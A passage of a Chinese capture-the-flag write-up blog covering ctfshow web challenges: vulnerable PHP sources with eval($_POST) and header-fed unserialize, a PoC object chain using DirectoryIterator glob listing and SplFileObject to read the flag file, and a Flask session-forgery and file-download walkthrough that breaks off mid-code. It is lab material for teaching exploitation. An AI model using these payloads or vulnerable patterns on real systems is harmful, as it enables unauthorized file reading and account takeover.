class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 12:15:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$image</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;ctfshow&#123;3ae89687-0319-4fdd-8d58-4910ede71b51&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$image</span>))&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$image</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,<span class="subst">$data</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;face.png&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:/?img=&quot;</span>.<span class="variable">$image</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前目录中有一个txt文件哦</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;check.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;text == <span class="string">&quot;aaaa&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">lcfirst</span>(<span class="variable">$this</span>-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$kk</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> cycycycy;</span><br><span class="line">        <span class="variable">$a</span> -&gt; <span class="title function_ invoke__">aaa</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">cipher</span>(<span class="variable">$get</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$get</span> === <span class="string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;eval&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a_a</span> = <span class="variable language_">$this</span> -&gt; a;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\$a_a\$&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span> -&gt; file))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;coos-&gt;name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$aa</span> = <span class="variable language_">$this</span>-&gt;coos;</span><br><span class="line">            <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$aa</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;不行哦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_AAAAAA&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_ip</span>);</span><br></pre></td></tr></table></figure><p>这题考察的就是原生类的做法</p><p><strong>实现了serializable接口的内置类就是c开头的</strong></p><p><a href="https://blog.csdn.net/JSPSEO/article/details/125135112">深入了解PHP反序列化原生类</a></p><p><a href="https://blog.csdn.net/weixin_61956136/article/details/125705264">web安全-PHP反序列化漏洞</a></p><p><img src="../images/image-20230404113117742.png" alt="image-20230404113117742"></p><p>本题就是用这个内置类来解题的</p><p>首先我们看到最下面这里是$ip = $SERVER[“HTTP_AAAAAA”]; 这一句话的意思是接收header头中 aaaaaa参数的值，然后将其反序列化。 然后根据提示在根目录中有一个txt文件，但是这里我们不知道他的文件名字是什么。</p><p><img src="../images/image-20230404114042321.png" alt="image-20230404114042321"></p><p><strong>这里传aaaaa是因为这个玩意对大小写不敏感，本地测试过了</strong></p><p><img src="../images/image-20230404115608848.png" alt="image-20230404115608848"></p><p>这里的格式就是和上面的内置类是一样的，并且<strong>coos</strong>和<strong>file</strong>还可控所以这里就可以直接查上面给的<strong>txt</strong>文件</p><p><strong>非预期</strong></p><p><a href="https://blog.csdn.net/qq_46570234/article/details/129928356?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168059578216800227488263%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168059578216800227488263&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-129928356-null-null.142^v81^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=ctfshow%20%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4187">非预期wp</a></p><p>这里就是只用到了两个类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span> -&gt; file))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;coos-&gt;name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$aa</span> = <span class="variable language_">$this</span>-&gt;coos;</span><br><span class="line">            <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$aa</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;不行哦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是只用到两个类，就是一个类用获取文件名，一个用来获取flag的值</p><p>我们知道在php中支持使用<code>$a($b)</code>这样动态的形式调用函数/实例化，</p><p>可以看到我们这一行就是这样的形式：<code>$a = new $this-&gt;coos($this-&gt;file);</code></p><p><strong>可遍历目录类有以下几个：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator 类</span><br><span class="line">FilesystemIterator 类</span><br><span class="line">GlobIterator 类</span><br></pre></td></tr></table></figure><p><strong>可读取文件类有：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SplFileObject 类</span><br></pre></td></tr></table></figure><p>我们需要用内置类来遍历目录，然后读取文件</p><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="comment">// private $eeee=&quot;-_-&quot;;</span></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;name=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$w</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>分两步走，第一步，读取文件名</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;glob:///*f*&quot;</span>; <span class="comment">#使用glob协来查找匹配的文件路径模式 这里/*f*匹配了根目录下包含f的文件夹名</span></span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;DirectoryIterator&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404163706592.png" alt="image-20230404163706592"></p><p>读取到了文件名，然后我们就用另一个内置类来读取文件内容</p><p><strong>第二步，使用<code>SplFileObject</code>类读取文件内容：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404163852169.png" alt="image-20230404163852169"></p><p>最后拿到flag</p><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>题目</p><p><img src="../images/image-20230404164641841.png" alt="image-20230404164641841"></p><p><strong>考点</strong></p><p><strong>flask的session伪造  +  任意文件下载  +  python命令执行</strong></p><p>这里注册的时候尝试使用admin账户注册，然后发现了这个账户存在，然后就注册个其他账户进行登录查看</p><p><img src="../images/image-20230404164920975.png" alt="image-20230404164920975"></p><p>这里的话应该要成为管理员才能进行获取flag</p><p>然后点击learn</p><p><img src="../images/image-20230404165019779.png" alt="image-20230404165019779"></p><p>看到了一些代码，这里我看到給key的时候，我就想到了是不是考的是<strong>session伪造或则是python反序列化</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"><span class="comment"># Check if user is loggedin</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br></pre></td></tr></table></figure><p>那么我们就去进行seesion伪造试试</p><p><img src="../images/image-20230404165301393.png" alt="image-20230404165301393"></p><p>拿到session</p><p><img src="../images/image-20230404170039525.png" alt="image-20230404170039525"></p><p>session伪造成功了</p><p><img src="../images/image-20230404170123835.png" alt="image-20230404170123835"></p><p>然后登录管理员账户成功，接下来就是有个下载的接口</p><p><img src="../images/image-20230404170215806.png" alt="image-20230404170215806"></p><p>发现是个假的flag</p><p><img src="../images/image-20230404170320851.png" alt="image-20230404170320851"></p><p>发现他是这样下载文件的，，然后我们就可以尝试下载完整的源码进行查看</p><p><strong>app.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 